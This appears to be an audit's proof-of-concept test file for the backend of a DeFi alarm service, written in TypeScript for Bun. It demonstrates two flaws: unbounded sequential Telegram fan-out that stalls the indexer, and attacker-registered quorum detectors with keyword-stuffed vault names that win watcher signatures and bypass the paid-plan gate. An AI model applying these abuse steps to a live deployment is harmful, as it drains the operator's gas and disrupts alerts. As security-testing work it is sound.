// PoCs for the offchain-backend lane. Copy into run/services/test/ and run: bun test test/poc-backend.test.ts
import { beforeEach, describe, expect, test } from "bun:test";
import { privateKeyToAccount } from "viem/accounts";
import type { Address, Hex } from "viem";
import { Kind, keyOf } from "../src/api/presets";
import { handle, notifyFollowers } from "../src/bot/bot";
import { feedSignal, type Signal } from "../src/detectors";
import type { Db } from "../src/store/db";
import { repo, type Repo } from "../src/store/repo";
import { acceptAttestation, matchVaults, maybeAttest } from "../src/watcher/watcher";
import { freshDb } from "./db";

const BOOK = "0x00000000000000000000000000000000000000aa" as Address;
const ATTACKER_VAULT = "0x00000000000000000000000000000000000000e1";
const wA = privateKeyToAccount(`0x${"a1".padStart(64, "0")}`);
const wB = privateKeyToAccount(`0x${"b2".padStart(64, "0")}`);

let db: Db;
let r: Repo;
beforeEach(async () => {
  db = await freshDb();
  r = repo(db);
});

describe("PoC-1: follower fan-out is unbounded and sequential (runs inside the indexer's alarms onLog)", () => {
  test("many chats can each follow one vault; one alert's send time grows linearly with them", async () => {
    const CHATS = 300;
    for (let chat = 1; chat <= CHATS; chat++) await handle(r, "https://x", chat, "watch", ATTACKER_VAULT);
    expect((await r.followers(ATTACKER_VAULT)).length).toBe(CHATS); // MAX_FOLLOWS is per chat only

    const PER_SEND_MS = 5; // stand-in for one Telegram round trip (real: ~50-100 ms, plus 429 retry_after sleeps)
    const t0 = performance.now();
    const sent = await notifyFollowers(r, async () => Bun.sleep(PER_SEND_MS), ATTACKER_VAULT, { vaultName: "x", alarm: "y" });
    const ms = performance.now() - t0;
    expect(sent).toBe(CHATS);
    expect(ms).toBeGreaterThanOrEqual(CHATS * PER_SEND_MS); // strictly serial
    console.log(`PoC-1: ${CHATS} followers x ${PER_SEND_MS} ms = ${ms.toFixed(0)} ms blocked in one onLog call`);
  });

  test("a 429 with retry_after makes the loop sleep that long per chat", async () => {
    for (let chat = 1; chat <= 3; chat++) await r.follow(chat, ATTACKER_VAULT);
    const seen = new Set<number>();
    const t0 = performance.now();
    await notifyFollowers(r, async (chat) => {
      if (!seen.has(chat)) { seen.add(chat); throw { error_code: 429, parameters: { retry_after: 0.2 } }; }
    }, ATTACKER_VAULT, { vaultName: "x", alarm: "y" });
    expect(performance.now() - t0).toBeGreaterThanOrEqual(600);
  });
});

describe("PoC-2: attacker-registered QUORUM keys get watcher signatures and reach the keeper's send queue with no plan check", () => {
  test("stuffed vault name matches, own-contract soft signal + any report => attestation => quorumReady, while liveKeys(paid) excludes it", async () => {
    // Indexer stored an attacker-registered QUORUM detector on the attacker's own contract (AlarmBook.register is open; only threshold is validated).
    const key = keyOf({ kind: Kind.QUORUM, target: ATTACKER_VAULT as Address, threshold: 2n, window: 0, a: `0x${"00".repeat(31)}01` as Hex, b: `0x${"00".repeat(32)}` as Hex });
    await db.query(`INSERT INTO detectors (key, kind, target, threshold, window_s, a, b) VALUES ($1,5,$2,2,0,'0x','0x')`, [key, ATTACKER_VAULT]);
    // The attacker also arms it from an unpaid wallet, to show the paid gate elsewhere.
    await r.upsertPosition({ posId: "0xp1", owner: "0xunpaid", adapter: "0xad", target: ATTACKER_VAULT, tokenId: 0n, harbour: 0, maxSlipBps: 0, epoch: 0n, block: 1n, termsHash: "0x", keys: [key] });

    // Detector: card name comes from the contract's name(); scanVault stores a GOVERNANCE soft signal whenever owner() changes.
    await r.saveCard(ATTACKER_VAULT, { name: "Aave Euler Spark Fluid Compound Pendle Ethena Resolv Stream" }, "card", 1);
    const soft: Signal = { kind: "GOVERNANCE", target: ATTACKER_VAULT as Hex, severity: "soft", value: 1, at: 100, evidence: "owner 0x1 -> 0x2" };

    // A real report about an unrelated protocol, labelled by the LLM.
    const report = { label: "EXPLOIT_CONFIRMED" as const, protocol: "Resolv", confidence: 0.95 };
    const keys = await db.query<{ key: Hex; target: Hex; name: string }>(
      `SELECT d.key, d.target, COALESCE(c.numbers->>'name', '') AS name FROM detectors d LEFT JOIN risk_cards c ON c.target=d.target WHERE d.kind=5`);
    const matched = matchVaults(report.protocol, keys);
    expect(matched.map((m) => m.key)).toEqual([key]);
    // And any report naming "morpho" matches every QUORUM key regardless of name.
    expect(matchVaults("Morpho", keys).length).toBe(keys.length);

    // Both watchers run the same code and sign.
    const feed = feedSignal(report, ATTACKER_VAULT as Hex, 100, "abc")!;
    for (const w of [wA, wB]) {
      const att = await maybeAttest(w, BOOK, 8453, key, [soft, feed], 100);
      expect(att).not.toBeNull();
      expect(await acceptAttestation(db, [wA.address, wB.address], BOOK, 8453, att!, 100)).toBe(true);
    }

    // Keeper's "quorum" loop (index.ts:159-161) -> tryQuorum -> keeper.send: no plan join here...
    expect((await r.quorumReady(2, 100)).map((q) => q.key)).toEqual([key]);
    // ...while the gated path the comments promise ("an unpaid key can't spend Canopy's gas") excludes it.
    expect(await r.liveKeys(100)).not.toContain(key);
  });
});
